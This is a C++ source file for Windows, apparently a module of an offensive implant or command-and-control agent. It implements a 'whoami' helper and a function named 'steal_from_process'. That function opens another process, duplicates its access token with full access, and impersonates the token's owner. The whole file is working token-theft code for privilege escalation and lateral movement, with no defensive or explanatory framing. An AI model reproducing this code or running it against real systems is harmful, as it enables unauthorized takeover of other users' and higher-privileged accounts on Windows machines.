#include "Tokens.h"

#include <windows.h>

#include <cstring>
#include <string>
#include <vector>

namespace tokens {

namespace {

std::string get_user(HANDLE token) {
    DWORD n = 0;
    GetTokenInformation(token, TokenUser, nullptr, 0, &n);
    if (n == 0) return "unknown";
    std::vector<std::uint8_t> b(n);
    if (!GetTokenInformation(token, TokenUser, b.data(), n, &n)) return "unknown";
    auto* tu = reinterpret_cast<TOKEN_USER*>(b.data());
    WCHAR name[256] = {0}, dom[256] = {0};
    DWORD nl = 256, dl = 256;
    SID_NAME_USE nu;
    if (!LookupAccountSidW(nullptr, tu->User.Sid, name, &nl, dom, &dl, &nu)) return "unknown";
    char u[256] = {0};
    WideCharToMultiByte(CP_UTF8, 0, name, -1, u, sizeof(u), nullptr, nullptr);
    return std::string(u);
}

} // namespace

std::string whoami() {
    HANDLE tok = nullptr;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &tok)) {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) return "error";
    }
    std::string r = get_user(tok);
    CloseHandle(tok);
    return r;
}

std::string steal_from_process(std::uint32_t pid) {
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return "error: OpenProcess " + std::to_string(GetLastError());
    HANDLE tok = nullptr;
    if (!OpenProcessToken(h, TOKEN_DUPLICATE | TOKEN_QUERY, &tok)) {
        CloseHandle(h);
        return "error: OpenProcessToken " + std::to_string(GetLastError());
    }
    CloseHandle(h);

    HANDLE dup = nullptr;
    if (!DuplicateTokenEx(tok, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation,
                          TokenImpersonation, &dup)) {
        CloseHandle(tok);
        return "error: DuplicateTokenEx " + std::to_string(GetLastError());
    }
    CloseHandle(tok);

    if (!ImpersonateLoggedOnUser(dup)) {
        CloseHandle(dup);
        return "error: ImpersonateLoggedOnUser " + std::to_string(GetLastError());
    }
    std::string r = "impersonated as " + whoami();
    RevertToSelf();
    CloseHandle(dup);
    return r;
}

} // namespace tokens
